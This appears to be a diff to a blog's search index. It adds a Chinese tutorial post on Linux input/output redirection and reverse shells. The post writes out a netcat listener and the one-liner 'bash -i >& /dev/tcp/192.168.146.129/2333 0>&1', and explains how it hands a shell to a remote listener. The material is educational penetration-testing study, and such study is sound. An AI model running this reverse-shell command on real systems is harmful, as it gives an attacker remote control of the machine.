@@ -66,6 +66,72 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux重定向和反弹Shell</title>
+    <url>/2022/04/29/Linux%E9%87%8D%E5%AE%9A%E5%90%91%E5%92%8C%E5%8F%8D%E5%BC%B9Shell/</url>
+    <content><![CDATA[<h1 id="Linux重定向和反弹shell"><a href="#Linux重定向和反弹shell" class="headerlink" title="Linux重定向和反弹shell"></a>Linux重定向和反弹shell</h1><p>学习链接：<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+<h2 id="Linux重定向"><a href="#Linux重定向" class="headerlink" title="Linux重定向"></a>Linux重定向</h2><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a><strong>输入重定向</strong></h3><p>再linux系统中 存在三种文件描述符</p>
+<p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p>
+<p>键盘作为标准输入设备 如果想要修改标准输入 也就是将其他文件或设备作为标准输入 就要用到输入重定向符 &lt;</p>
+<p>举个例子</p>
+<p><img src="https://s2.loli.net/2022/04/28/qcmLutRX7yziIBO.png" alt="image-20220428161635333"></p>
+<p>正常逻辑是cat y1 为什么这里cat放在y1后面也可以读取</p>
+<p>这里命令分为了两个部分 第一个部分是 0&lt; y1 第二部分是cat 如果默认输入设备为键盘的话 那么cat就会读取cat 后从键盘输入的东西 比如 cat y1</p>
+<p>而第一部分0&lt; y1 将标准输入设备重定向到了y1中 也就是说y1现在就可以当成是键盘了 y1的内容就是我们从键盘上输出的内容 cat 后读取的是默认输入 而现在经过重定向后的默认输入为y1 所以重定向后直接cat 不需要参数就可以读取y1的内容</p>
+<p>然后仔细说一下0&lt; y1 上面提到0是默认输入设备 也就是键盘 输入重定向符将后面的y1 重定向输入到了文件描述符0中 如果输入重定向符前面没有文件描述符 那么默认为0 也就是说 <strong>重定向符修改的是文件描述符（实际上是修改了文件描述符的指针） 不是文件！！！！</strong></p>
+<p>&lt;为清除输入重定向符 重定向时会将输入目标清空后进行重定向</p>
+<p>&lt;&lt; 为追加输入重定向符 重定向时会保留原有数据 在文件末追加输入内容</p>
+<h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a><strong>输出重定向</strong></h3><p>相比于输入重定向 输出重定向更加常用</p>
+<p><img src="https://s2.loli.net/2022/04/28/tTlzQdObpxSfM8e.png" alt="image-20220428162920640"></p>
+<p><img src="https://s2.loli.net/2022/04/28/dxb3AnkLycWpuEG.png" alt="image-20220428162941912"></p>
+<p>上面这两个例子 第一个echo输出字符串 这时的默认输出设备是显示器 所以echo后就会在显示器上显示出来</p>
+<p>第二个例子 将标准输出设备重定向为y1文件 那么此时就可以把y1当成显示器了 echo后的字符串会在y1内显示 </p>
+<p>但是y1是个文件 并不能直接产生回显 所以要用cat进行读取 可以看到重定向成功</p>
+<p>刚才提到重定向符修改的是文件描述符 所以1&gt; 重定向目标 和 &gt; 重定向目标是一样的 没有参数1则默认为1\</p>
+<p>&gt;为清除输入重定向符 重定向时会将输出目标清空后进行重定向</p>
+<p>&gt;&gt;为追加输出重定向符 重定向时会保留原有数据 在文件末追加输出内容</p>
+<h3 id="标准输出与标准报错输出重定向"><a href="#标准输出与标准报错输出重定向" class="headerlink" title="标准输出与标准报错输出重定向"></a><strong>标准输出与标准报错输出重定向</strong></h3><p>格式： &amp;&gt; word &gt;&amp; word</p>
+<p>这两种格式都等价于  </p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">1&gt; </span><span class="language-bash">目标重定向</span>  </span><br><span class="line"><span class="meta prompt_">2&gt; </span><span class="language-bash">&amp;1    //这个符号一会会说</span></span><br></pre></td></tr></table></figure>
+
+<p>那么2是什么呢 我们知道1是标准输出 刚才也提到了 2是标准错误输出 也就是说2会输出命令产生的报错信息  </p>
+<p>上面的两步骤 1&gt; y1 将标准输出重定向到了y1         2&gt; &amp;1 将标准报错输出重定向到了和标准输出1一样的y1 这里的连接符&amp;表示后面的字符为文件描述符 如果不加后面的1就会被当成文件进行重定向输出</p>
+<p>现在1和2的指针都指向了y1 所以在进行输出时（不论是标准输出 还是标准报错输出）都会输出在y1中 cat y1就可以看到标准输出和标准报错输出的结果了</p>
+<p><img src="https://s2.loli.net/2022/04/28/4Wjbeu13trhqOwE.png" alt="image-20220428164427836"></p>
+<p><img src="https://s2.loli.net/2022/04/28/4m9XWQndU6fPgtL.png" alt="image-20220428164403889"></p>
+<p>这里要注意 系统在解析命令时是从左到右解析的 如果有重定向符就先进行重定向 再执行命令 所以重定向时命令和重定向要符合逻辑 不能乱改</p>
+<p>其他还有一些 东西移步上面的链接</p>
+<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a><strong>反弹Shell</strong></h2><h3 id="什么是反弹shell-为什么要反弹shell"><a href="#什么是反弹shell-为什么要反弹shell" class="headerlink" title="什么是反弹shell 为什么要反弹shell"></a>什么是反弹shell 为什么要反弹shell</h3><p>在进行渗透测试时 很可能遇到目标靶机在局域网内 或防火墙内不能ping通 这时我们可以在本机或一个可控的服务端开放一个端口进行监听 并让目标靶机开启一个交互终端 并连接到我们在本机上开放的端口 并且通过重定向将目标机的输入和输出重定向到本机上 从而可以远程控制目标靶机</p>
+<p>可能我说的不太准确 放一个官方一点的解释</p>
+<p><img src="https://s2.loli.net/2022/04/28/Linqh1AtbOKaHvQ.png"></p>
+<h3 id="反弹Shell过程解析"><a href="#反弹Shell过程解析" class="headerlink" title="反弹Shell过程解析"></a>反弹Shell过程解析</h3><p>先在attacker上执行 监听2333端口</p>
+<p>nc netcat linux上自带的一个程序 可以用来进行两台主机的通信</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+
+<p>再在victim上执行</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>解析一下 这串命令</p>
+<p><strong>1.bash -i</strong></p>
+<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
+<p>2）-i 这个参数表示的是产生交互式的shell</p>
+<p><strong>2.&gt;&amp; 0&gt;&amp;1</strong></p>
+<p>根据上面的重定向知识可以知道 这一步是将重定向符号前面的标准输出和标准报错输出重定向到重定向符号后面</p>
+<p>也就是将bash -i 重定向到了attacker的2333端口   再将标准输入0重定向到和标准输出1一样的位置 也就是attacker的2333端口</p>
+<p><strong>3./dev/tcp/</strong></p>
+<p>/dev/tcp 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图：</p>
+<p><img src="https://s2.loli.net/2022/04/28/897pNCcvdDjZxyr.png" alt="image-20220428170849009"></p>
+<p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>网安</category>
+      </categories>
+      <tags>
+        <tag>Linux重定向</tag>
+        <tag>反弹Shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SSRF</title>
     <url>/2022/04/16/SSRF/</url>
     <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="首先了解一个东西-内网和外网"><a href="#首先了解一个东西-内网和外网" class="headerlink" title="首先了解一个东西 内网和外网"></a>首先了解一个东西 内网和外网</h3><p>我们知道每一台计算机都有一个属于自己的ip 并且不只计算机 服务器（可以看作远程提供服务的计算机）也有自己的ip</p>
